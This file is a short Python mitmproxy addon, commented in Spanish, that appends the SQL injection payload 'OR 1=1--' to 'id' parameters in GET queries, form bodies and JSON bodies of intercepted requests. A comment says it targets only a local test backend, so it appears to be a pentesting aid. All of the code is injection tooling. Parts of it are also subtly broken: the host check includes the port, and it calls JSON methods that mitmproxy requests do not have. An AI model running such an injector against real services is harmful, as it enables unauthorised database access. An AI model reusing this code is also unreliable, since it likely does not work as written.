# sqli_injector.py

from mitmproxy import http, ctx

def request(flow: http.HTTPFlow) -> None:
    # Limitar solo al backend de pruebas
    if "127.0.0.1:8000" not in flow.request.host:
        return

    # GET ?id= -> injecta OR 1=1--
    if flow.request.query.get("id") is not None:
        orig = flow.request.query["id"]
        inj = f"{orig} OR 1=1--"
        flow.request.query["id"] = inj
        ctx.log.info(f"[Injector] id GET inyectado: {inj}")

    # POST form id= -> mismo payload
    if flow.request.urlencoded_form.get("id"):
        orig = flow.request.urlencoded_form["id"]
        inj = f"{orig} OR 1=1--"
        flow.request.urlencoded_form["id"] = inj
        ctx.log.info(f"[Injector] id FORM inyectado: {inj}")

    # JSON {"id":...} -> inyecta y reemplaza
    try:
        j = flow.request.get_json(silent=True)
        if j and "id" in j:
            j["id"] = f"{j['id']} OR 1=1--"
            flow.request.set_json(j)
            ctx.log.info(f"[Injector] id JSON inyectado: {j['id']}")
    except Exception:
        pass
